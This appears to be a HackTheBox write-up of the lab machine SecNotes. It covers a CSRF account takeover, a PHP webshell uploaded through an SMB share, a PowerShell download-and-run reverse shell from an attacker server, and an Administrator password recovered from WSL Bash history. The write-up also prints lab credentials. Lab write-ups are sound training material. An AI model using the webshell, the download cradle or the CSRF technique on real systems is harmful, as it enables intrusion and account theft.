# SecNotes — HackTheBox, Windows (Medium)

## Summary

SecNotes is a Windows box that rewards methodical web enumeration and an eye for Windows-specific misconfigurations. Initial access comes from a **CSRF** flaw in a notes application's password-change function, abused through the app's own "Contact Us" feature to hijack another user's account. Those credentials open an **SMB share mapped to the IIS web root**, where a webshell gives remote code execution. Privilege escalation is pure Windows tradecraft: a **WSL (Windows Subsystem for Linux)** installation left the Administrator password in plaintext inside root's Bash history. The recurring lesson: authentication can be bypassed without ever cracking a password, and a credential is only as safe as the least-guarded place it was ever typed.

## Recon & Enumeration

An `nmap` service scan showed a small surface:

```
80/tcp  open  http         Microsoft IIS httpd 10.0   (Secure Notes - Login, login.php)
445/tcp open  microsoft-ds Windows SMB (workgroup: HTB, host SECNOTES)
```

A later full-port scan (`nmap -p-`) revealed the third port, **8808**, that the default top-1000 scan had missed — the pivot for code execution later.

SMB allowed a guest account, but share listing was denied (`NT_STATUS_ACCESS_DENIED`) — expected, and not a sign SMB is closed; anonymous listing is commonly blocked even when authenticated access to a specific share is allowed. SMB here is not the entry point: it needs credentials first, and those come from the web app.

The 8808 site turns out to be the pivot for code execution, so the takeaway is a methodology one: always scan all ports before committing to a path.

## Foothold / Initial Access

### Mapping the application

The site is a PHP notes app. The login page leaks **user existence** ("No account found with that username"), confirming the username is used in a lookup query. After registering and logging in, the app displays the current user's name in a header — "Viewing Secure Notes for `<user>`" — and exposes a **Contact Us** form addressed to `tyler@secnotes.htb`, revealing a real user: **tyler**.

I spent time testing the username field for SQL injection (single quote, double quote, comparing registered-then-login behaviour). The results didn't line up with an exploitable injection — a single quote broke login but a double quote behaved normally, which argued against a clean SQLi path. Rather than force that theory, I pivoted to the functionality the app actually exposed.

### CSRF → account takeover

Inspecting the password-change request in Burp showed the key weakness:

```
GET /change_pass.php?password=<new>&confirm_password=<new>&submit=submit
```

The request carries **no anti-CSRF token** and identifies the user **solely by the session cookie**. That means any authenticated user who loads a crafted URL changes *their own* password. Combined with the Contact Us form — which delivers a message to **tyler**, a user who opens what he receives — this becomes a full account takeover:

1. Submit a Contact Us message to tyler containing a link to `change_pass.php?password=<attacker-chosen>...`.
2. Tyler's client opens the link while authenticated; his browser sends his session cookie automatically, and the request sets **his** password to the attacker's value.
3. Log in as tyler with the new password.

**Why it works:** the change-password action has no CSRF protection and trusts the ambient session cookie to decide whose password to change. A victim's browser attaches that cookie to any request to the site, so an attacker-authored link acts with the victim's identity. This is textbook CSRF, and the Contact Us form is the delivery vector that gets a logged-in victim to trigger it.

Inside tyler's account, one of his private notes ("new site") held real credentials and a share path:

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGj0irkL%OG^A
```


### SMB share → webshell → RCE

Authenticating to SMB as tyler and connecting to the `new-site` share revealed `iisstart.htm` and `iisstart.png` — the default files of an IIS site. The share is **mapped to the web root of the second IIS site (port 8808)**, so anything written to the share is served over HTTP, and because the server runs PHP, a `.php` file executes as code.

Uploading a minimal webshell through SMB and requesting it over HTTP gave command execution:

```
smb: \> put cmd.php      (<?php system($_GET["cmd"]); ?>)
http://secnotes.htb:8808/cmd.php?cmd=whoami  →  secnotes\tyler
```

From the webshell I launched a PowerShell reverse shell by loading a Nishang script straight into memory from an attacker-hosted HTTP server (`IEX (New-Object Net.WebClient).DownloadString(...)`) — fileless, so nothing touches disk. The listener caught a shell as **tyler**, and the user flag was on tyler's Desktop.


## Privilege Escalation

Enumerating the filesystem surfaced the tell-tale signs of **WSL**:

```
C:\Distros
C:\Ubuntu.zip              (~200 MB)
C:\Users\tyler\Desktop\bash.lnk
C:\Windows\System32\bash.exe
```

The box runs a full Ubuntu userland under Windows. Reading the WSL root user's Bash history exposed the prize:

```
bash.exe -c "cat /root/.bash_history"
...
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$
```

The Administrator password was sitting in plaintext in `/root/.bash_history`, left behind when WSL was set up and someone ran `smbclient` with inline credentials.

**Why this works:** WSL maintains its own Linux root account whose shell history is completely separate from anything Windows audits or clears, and `smbclient -U 'user%password'` places the password directly on the command line, where the shell dutifully records it. A credential typed once into a convenience tool persists in a place few people think to clean.

With the Administrator password, `impacket-psexec` gave a SYSTEM shell and the root flag:

```
impacket-psexec 'administrator:u6!4ZwgwOM#^OBf#Nwnh@<ip>'
→ nt authority\system
type C:\Users\Administrator\Desktop\root.txt
```

## Key Takeaways

- **Authentication bypass ≠ password cracking.** No hash was cracked for the foothold. A missing CSRF token plus a form that delivers links to a live user was enough to take over an account outright — a reminder to look at *what an app lets you make another user do*, not just at injection.
- **Test the theory, then drop it if the evidence disagrees.** The username field looked injectable but the behaviour didn't support a usable SQLi. Chasing it further would have wasted time; the exposed functionality (change-password + Contact Us) was the real path.
- **Scan all ports.** The default scan missed port 8808, which hosted the IIS site the share was mapped to. The foothold lived on the port the quick scan skipped.
- **A credential is only as safe as the least-guarded place it was typed.** WSL's Bash history is outside Windows' usual credential hygiene, and inline `smbclient` credentials ended up there in cleartext. Shell history — on either OS — is a credential store worth checking every time.
